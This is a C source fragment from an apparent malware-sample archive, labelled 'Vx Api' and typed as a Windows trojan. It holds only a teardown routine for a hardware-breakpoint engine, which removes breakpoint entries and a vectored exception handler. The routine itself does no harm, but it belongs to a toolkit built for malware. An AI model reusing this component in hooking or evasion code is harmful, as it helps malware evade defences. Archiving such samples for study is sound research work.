/*
  name      Vx Api
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
#include "Win32Helper.h"

BOOL ShutdownHardwareBreakpointEngine(VOID)
{
	DESCRIPTOR_ENTRY *TempObject = NULL;

	if (!GlobalHardwareBreakpointObject.IsInit)
		return TRUE;

	EnterCriticalSection(&CriticalSection);

	TempObject = Head;

	while (TempObject != NULL)
	{
		RemoveDescriptorEntry(TempObject->Address, TempObject->Tid);
		TempObject = TempObject->Next;
	}

	LeaveCriticalSection(&CriticalSection);

	if (GlobalHardwareBreakpointObject.HandlerObject)
		RemoveVectoredExceptionHandler(GlobalHardwareBreakpointObject.HandlerObject);

	DeleteCriticalSection(&CriticalSection);

	GlobalHardwareBreakpointObject.IsInit = FALSE;

	return TRUE;
}